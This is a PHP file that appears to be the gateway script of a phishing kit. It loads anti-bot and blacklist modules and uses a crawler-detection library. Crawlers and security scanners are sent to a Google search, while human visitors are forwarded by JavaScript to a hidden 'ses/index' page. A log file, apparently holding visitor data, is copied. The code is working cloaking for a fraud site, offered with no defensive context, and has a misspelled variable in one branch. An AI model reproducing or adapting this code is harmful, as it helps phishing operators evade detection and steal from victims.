<?php

$useragent = $_SERVER['HTTP_USER_AGENT'];
$settings = include '../settings/settings.php';
include("Bots/fucker.php");
include("Bots/Anti/out/blacklist.php");
include("Bots/Anti/out/bot-crawler.php");
include("Bots/Anti/out/anti.php");
include("Bots/Anti/out/ref.php");
include("Bots/Anti/out/bots.php");
@require("Bots/Anti/out/Crawler/src/CrawlerDetect.php");

use JayBizzle\CrawlerDetect\CrawlerDetect;

$CrawlerDetect = new CrawlerDetect;




if($settings['print_match'] == "1"){
	echo $CrawlerDetect->getMatches();
}

if($CrawlerDetect->isCrawler($useragent)){
	header('Location: https://href.li/?https://www.google.com/search?q='.$settings['out']);
} else if (!$CrawlerDetect->isCrawler($usergent)){
	copy("../Logs/client.txt", "client.txt");
	echo "<script>window.location.href = \"ses/index\"; </script>";
}

$bot = include 'Bots/bot.php';
if($bot == "is_bot"){
  header("HTTP/1.0 404 Not Found");
  die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}

?>